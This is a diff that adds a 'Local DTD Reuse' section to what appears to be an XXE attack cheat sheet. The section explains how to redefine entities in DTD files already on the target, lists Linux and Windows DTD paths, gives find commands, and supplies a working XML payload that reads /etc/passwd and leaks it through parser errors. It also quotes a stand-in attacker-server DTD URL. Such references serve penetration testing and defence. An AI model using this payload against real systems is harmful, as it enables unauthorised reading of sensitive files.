@@ -762,6 +762,36 @@ External DTD (`http://your-attacker-server.com/dtd.xml`):
    %error;
    ```
 
+##### Local DTD Reuse (no egress)
+
+When outbound network access is blocked, you cannot fetch an attacker-hosted external DTD. Instead, repurpose a DTD file already present on the target's disk: load it as a parameter entity, then **redefine** one of its internal parameter entities to inject your own `%file;`/`%eval;`/`%error;` chain. Redefinition works because the first definition of a parameter entity wins, so your override (placed in the internal subset, before the local DTD is pulled in) takes effect when the local DTD references that entity. This yields error-based leakage without any egress.
+
+Common local DTDs to target:
+
+- **Linux**: `/usr/share/xml/fontconfig/fonts.dtd` — defines `<!ENTITY % constant ...>`, which is a good redefinition hook.
+- **Windows**: `file:///C:\Windows\System32\wbem\xml\cim20.dtd` (redefine `<!ENTITY % SuperClass ...>`).
+
+Discover candidate DTDs already on the host with `locate .dtd` / `find / -name '*.dtd' 2>/dev/null`, or use GoSecure's [dtd-finder](https://github.com/GoSecure/dtd-finder) to enumerate parsable local DTDs and their redefinable entities.
+
+Representative skeleton (Linux `fonts.dtd`, overriding its `constant` entity to chain file read into an error message):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+  <!ENTITY % constant '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+<message>any</message>
+```
+
+The leaked file content surfaces inside the parser's "file not found" error (the `file:///nonexistent/<contents>` path), so this needs an error-based-XXE sink (error messages reflected to the client).
+
 ##### XXE for SSRF
 
 Use XXE to trigger internal requests:
